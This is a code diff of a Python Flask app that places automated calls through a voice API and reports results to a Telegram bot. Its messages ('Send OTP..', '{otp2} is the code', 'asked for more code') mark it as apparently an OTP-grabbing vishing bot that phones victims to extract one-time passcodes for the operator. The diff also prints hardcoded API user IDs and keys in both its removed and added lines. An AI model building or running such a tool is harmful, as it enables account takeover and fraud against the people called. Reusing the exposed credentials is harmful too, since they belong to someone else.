@@ -2,6 +2,9 @@ from flask import Flask, jsonify, request
 import requests
 import json
 import urllib.parse
+apivalley_userid = '9acee9fa-00a3-40be-9916-ee6b27d313bd'
+apivalley_key='edLOD2IwIAjC3FC9L1eZ9pcClE95usGBo4xrwOcDHavTHe8DtKOv080wMZ39xtCk'
+
 class CallSidManager:
     def __init__(self):
         self.current_id = 0
@@ -90,7 +93,7 @@ def call(chat_id,name):
                 'https://api.apivalley.su/api/v1/calls/gather-say',
                 headers=headers,
                 json=data,  
-                auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
+                auth=(apivalley_userid, apivalley_key),
             )
             cca = str(short_id +"$"+ chat_id)
             callback_accept = json.dumps({"action": 1, "sid": cca })
@@ -161,7 +164,7 @@ def call(chat_id,name):
                     'https://api.apivalley.su/api/v1/calls/gather-say',
                     headers=headers,
                     json=data,  
-                    auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
+                    auth=(apivalley_userid, apivalley_key),
                 )
                 r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📲 Send OTP..")
 
@@ -185,7 +188,7 @@ def call(chat_id,name):
                     'https://api.apivalley.su/api/v1/calls/gather-say',
                     headers=headers,
                     json=data,  
-                    auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
+                    auth=(apivalley_userid, apivalley_key),
                 )
                 
                 r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ {otp2} is the code")
@@ -223,7 +226,7 @@ def handle_update():
                 'https://api.apivalley.su/api/v1/calls/say',
                 headers=headers,
                 json=data,  
-                auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
+                auth=(apivalley_userid, apivalley_key),
             )
             r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ code accepted")
     elif action == 'endcall' :
@@ -240,7 +243,7 @@ def handle_update():
                 'https://api.apivalley.su/api/v1/calls/hangup',
                 headers=headers,
                 json=data,  
-                auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
+                auth=(apivalley_userid, apivalley_key),
             )
     elif action == 2 :  
         callsid1 = call_sid_manager.get_callsid(callsid)
@@ -260,7 +263,7 @@ def handle_update():
             'https://api.apivalley.su/api/v1/calls/gather-say',
             headers=headers,
             json=data,  
-            auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
+            auth=(apivalley_userid, apivalley_key),
         )
         r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ code rejected")
     elif action == 3 : 
@@ -281,7 +284,7 @@ def handle_update():
             'https://api.apivalley.su/api/v1/calls/gather-say',
             headers=headers,
             json=data,  
-            auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
+            auth=(apivalley_userid, apivalley_key),
         ) 
         r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ asked for more code")
 
@@ -308,4 +311,4 @@ def decline(sid):
 
 
 if __name__ == "__main__":    
-    app.run("0.0.0.0", port=8080)
+    app.run("0.0.0.0", port=5000)
